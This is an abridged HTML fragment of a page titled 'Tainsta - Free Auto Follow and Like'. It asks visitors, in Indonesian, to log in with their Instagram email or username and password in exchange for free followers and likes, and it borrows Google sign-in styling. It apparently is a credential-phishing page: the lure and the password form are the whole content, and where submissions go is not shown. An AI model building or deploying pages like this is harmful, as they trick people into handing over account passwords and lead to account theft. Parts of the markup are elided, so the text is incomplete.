...
<body>
  ...
  <title>Tainsta - Free Auto Follow and Like</title>
...
<h1>
  ...
  Masuk menggunakan akun Instagram Anda</h2>
</div>
...
<input id="Email" name="email" type="email" placeholder="Email atau Username" value="" spellcheck="false" class=""><br>
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="password" type="password" placeholder="Password" spellcheck="false" class=""><br>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Masuk">
  </div>
  </div>
  </label>
...
<div class="one-google">
  ...
  <p></p>
<p class="tagline">
  Copyright 2018 Tainsta Gram Free
</p>
</div>
  </div>
